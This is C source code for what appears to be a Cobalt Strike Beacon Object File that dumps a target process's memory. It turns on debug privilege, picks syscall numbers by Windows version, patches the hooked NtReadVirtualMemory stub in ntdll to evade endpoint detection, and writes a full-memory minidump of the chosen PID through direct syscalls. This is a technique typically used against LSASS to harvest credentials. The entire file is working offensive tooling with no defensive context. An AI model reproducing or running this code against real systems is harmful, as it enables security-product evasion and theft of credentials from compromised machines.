#include <windows.h>
#include <stdio.h>
#include <dbghelp.h>
#include "beacon.h"

#include "Syscalls.h"
#include "SyscallsDump.h"

BOOL SetDebugPrivilege() {
  HANDLE hToken = NULL;
  TOKEN_PRIVILEGES TokenPrivileges = { 0 };

  NTSTATUS status = ZwOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken);
  if (status != STATUS_SUCCESS) {
    return FALSE;
  }

  TokenPrivileges.PrivilegeCount = 1;
  TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  LPCWSTR lpwPriv = L"SeDebugPrivilege";
  if (!ADVAPI32$LookupPrivilegeValueW(NULL, lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
    ZwClose(hToken);
    return FALSE;
  }

  status = ZwAdjustPrivilegesToken(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
  if (status != STATUS_SUCCESS) {
    ZwClose(hToken);
    return FALSE;
  }

  ZwClose(hToken);

  return TRUE;
}

// Open a handle to the target process
HANDLE GetProcessHandle(DWORD dwPid) {
  
  NTSTATUS status;
  HANDLE hProcess = NULL;
  OBJECT_ATTRIBUTES ObjectAttributes;

  InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
  CLIENT_ID uPid = { 0 };

  uPid.UniqueProcess = (HANDLE)(DWORD_PTR)dwPid;
  uPid.UniqueThread = (HANDLE)0;

  status = ZwOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE, &ObjectAttributes, &uPid);
  if (hProcess == NULL) {
    return NULL;
  }

  return hProcess;
}


BOOL UnhookFunction(IN PWIN_VER_INFO pWinVerInfo){
  BYTE AssemblyBytes[] = {0x4C, 0x8B, 0xD1, 0xB8, 0xFF};
  BYTE Syscall = pWinVerInfo->SystemCall;
  AssemblyBytes[4] = Syscall;

  LPVOID lpProcAddress = GetProcAddress(LoadLibrary("ntdll.dll"), "NtReadVirtualMemory");

  LPVOID lpBaseAddress = lpProcAddress;
  ULONG OldProtection, NewProtection;
  SIZE_T uSize = 10;

  NTSTATUS status = ZwProtectVirtualMemory(NtCurrentProcess(), &lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
  if (status != STATUS_SUCCESS) {
    BeaconPrintf(CALLBACK_ERROR, "Unhooking - Initial ZwProtectVirtualMemory failed.");
    return FALSE;
  }
  
  status = ZwWriteVirtualMemory(NtCurrentProcess(), lpProcAddress, (PVOID)AssemblyBytes, sizeof(AssemblyBytes), NULL);
  if (status != STATUS_SUCCESS) {
    BeaconPrintf(CALLBACK_ERROR, "Unhooking - ZwWriteVirtualMemory failed.");
    return FALSE;
  }

  status = ZwProtectVirtualMemory(NtCurrentProcess(), &lpBaseAddress, &uSize, OldProtection, &NewProtection);
  if (status != STATUS_SUCCESS) {
    BeaconPrintf(CALLBACK_ERROR, "Unhooking - Final ZwProtectVirtualMemory failed.");
    return FALSE;
  }

  return TRUE;

}


void go(char *args, int len) {    
  DWORD pid;
  char * output_file;
  datap parser;

  BeaconDataParse(&parser, args, len);
  pid = BeaconDataInt(&parser);
  output_file = BeaconDataExtract(&parser, NULL);

  //////////// Set Debug Privilege //////////////

  if(!SetDebugPrivilege()){
    BeaconPrintf(CALLBACK_ERROR, "Failed to set debug privilege.");
    return;
  }

  //////////// Get System Version //////////////

  _RtlGetVersion RtlGetVersion = (_RtlGetVersion)
    GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
  if (RtlGetVersion == NULL) {
    return;
  }

  PWIN_VER_INFO pWinVerInfo = (PWIN_VER_INFO)MSVCRT$calloc(1, sizeof(WIN_VER_INFO));

  OSVERSIONINFOEXW osInfo;
  LPWSTR lpOSVersion;
  osInfo.dwOSVersionInfoSize = sizeof(osInfo);
  
  RtlGetVersion(&osInfo);
  MSVCRT$swprintf_s(pWinVerInfo->chOSMajorMinor, _countof(pWinVerInfo->chOSMajorMinor), L"%u.%u", osInfo.dwMajorVersion, osInfo.dwMinorVersion);
  pWinVerInfo->dwBuildNumber = osInfo.dwBuildNumber;

  //////////// Set Syscall byte value //////////////

  if (MSVCRT$_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
    lpOSVersion = L"10 or Server 2016";
    BeaconPrintf(CALLBACK_OUTPUT,"Using Syscalls for Windows %ls, build number %d\nDumping PID %d to file: %s\n", lpOSVersion, pWinVerInfo->dwBuildNumber, pid, output_file);
    pWinVerInfo->SystemCall = 0x3F;
  }
  else if (MSVCRT$_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && osInfo.dwBuildNumber == 7601) {
    lpOSVersion = L"7 SP1 or Server 2008 R2";
    BeaconPrintf(CALLBACK_OUTPUT,"Using Syscalls for Windows %ls, build number %d\nDumping PID %d to file: %s\n", lpOSVersion, pWinVerInfo->dwBuildNumber, pid, output_file);
    pWinVerInfo->SystemCall = 0x3C;
  }
  else if (MSVCRT$_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
    lpOSVersion = L"8 or Server 2012";
    BeaconPrintf(CALLBACK_OUTPUT,"Using Syscalls for Windows %ls, build number %d\nDumping PID %d to file: %s\n", lpOSVersion, pWinVerInfo->dwBuildNumber, pid, output_file);
    pWinVerInfo->SystemCall = 0x3D;
  }
  else if (MSVCRT$_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
    lpOSVersion = L"8.1 or Server 2012 R2";
    BeaconPrintf(CALLBACK_OUTPUT,"Using Syscalls for Windows %ls, build number %d\nDumping PID %d to file: %s\n", lpOSVersion, pWinVerInfo->dwBuildNumber, pid, output_file);
    pWinVerInfo->SystemCall = 0x3E;
  }
  else {
    BeaconPrintf(CALLBACK_OUTPUT,"  [!] OS Version not supported.\n\n");
    return;
  }

  //////////// Unhook NtReadVirtualMemory //////////////

  if(!UnhookFunction(pWinVerInfo)){
    BeaconPrintf(CALLBACK_ERROR, "Failed to unhook NtReadVirtualMemory.");
    return;
  }

  //////////// Get target process PID //////////////

  HANDLE hProcess = NULL;
  hProcess = GetProcessHandle(pid);

  if (!hProcess) {
    BeaconPrintf(CALLBACK_ERROR, "Failed to retrieve PID %d process handle.", pid);
    return;
  }

  //////////// Prepare output file //////////////

  _RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
    GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
  if (RtlInitUnicodeString == NULL) {
    goto Cleanup;
  }

  // I hate C.
  char chDmpFile[MAX_PATH] = "\\??\\";
  MSVCRT$strcat(chDmpFile, output_file);
  wchar_t dst[MAX_PATH];
  toWideChar(chDmpFile, dst, MAX_PATH);
  UNICODE_STRING uOutputFile;
  RtlInitUnicodeString(&uOutputFile, dst);

  HANDLE hDmpFile = NULL;
  IO_STATUS_BLOCK IoStatusBlock;
  intZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
  OBJECT_ATTRIBUTES FileObjectAttributes;
  InitializeObjectAttributes(&FileObjectAttributes, &uOutputFile, OBJ_CASE_INSENSITIVE, NULL, NULL);

  //////////// Open dump file //////////////
  
  NtCreateFile(&hDmpFile, FILE_GENERIC_WRITE, &FileObjectAttributes, &IoStatusBlock, 0,
    FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

  if (!hDmpFile) {
    BeaconPrintf(CALLBACK_ERROR, "Failed to create dump file at %s", output_file);
    goto Cleanup;
  }

  //////////// Dump target process //////////////

  BOOL Success = DBGHELP$MiniDumpWriteDump(hProcess,
    pid,
    hDmpFile,
    MiniDumpWithFullMemory,
    NULL,
    NULL,
    NULL);

  if (!Success) {
    BeaconPrintf(CALLBACK_ERROR, "Failed to create minidump.");      
  } else {
    BeaconPrintf(CALLBACK_OUTPUT, "Success!");
  }
  ZwClose(hDmpFile);

  goto Cleanup;

Cleanup:
  ZwClose(hProcess);
}
